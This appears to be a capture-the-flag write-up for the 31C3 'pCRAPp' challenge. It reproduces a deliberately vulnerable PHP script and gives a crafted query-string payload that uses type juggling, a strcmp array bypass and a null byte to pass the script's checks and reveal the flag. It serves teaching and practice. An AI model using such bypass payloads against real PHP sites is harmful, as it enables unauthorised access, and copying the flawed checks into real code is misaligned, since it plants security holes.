## 31C3 CTF - pCRAPp (10 points)
##### 27-29/12/2014 (48hr)
___
### Description
PHP is nasty crappy sometimes, just pwn it

http://188.40.18.69/

___
### Solution

Source code is given:
```
<?php 
    show_source(__FILE__);
    $v1=0;$v2=0;$v3=0;$v4=0;
    $a=(array)json_decode(@$_GET['a']);
    if(is_array($a)){
        is_numeric(@$a["a1"])?die("nope"):NULL;
        if(@$a["a1"]){
            ($a["a1"]>1336)?$v1=1:NULL;
        }
        if(is_array(@$a["a2"])){
            if(count($a["a2"])!==5 OR !is_array($a["a2"][0])) die("nope");
            $pos = array_search("ctf", $a["a2"]);
            $pos===false?die("nope"):NULL;
            foreach($a["a2"] as $key=>$val){
                $val==="ctf"?die("nope"):NULL;
            }
            $v2=1;
        }
    }
    if(preg_match("/^([0-9]+\.?[0-9]+)+$/",@$_GET['b'])){
        $b=json_decode(@$_GET['b']);
        if($var = $b === NULL){
            ($var===true)?$v3=1:NULL;
        }
    }
    $c=@$_GET['c'];
    $d=@$_GET['d'];
    if(@$c[1]){
        if(!strcmp($c[1],$d) && $c[1]!==$d){
            eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
            strpos(($c[0].$d), "31c3")?$v4=1:NULL;
        }
    }
    if($v1 && $v2 && $v3 && $v4){
        include "flag.php";
        echo $flag;
    }
?>
```

Solution is simple:
```
http://188.40.18.69/pCRAPp.php?a={"a1":"1337a","a2":[[],0,"z","z","z"]}&c[0]=a&c[1][]=1&d=%0031c3&b=09
```

Get the flag: **31c3_pHp_h4z_f41l3d_d34l_w1tH_1T**

___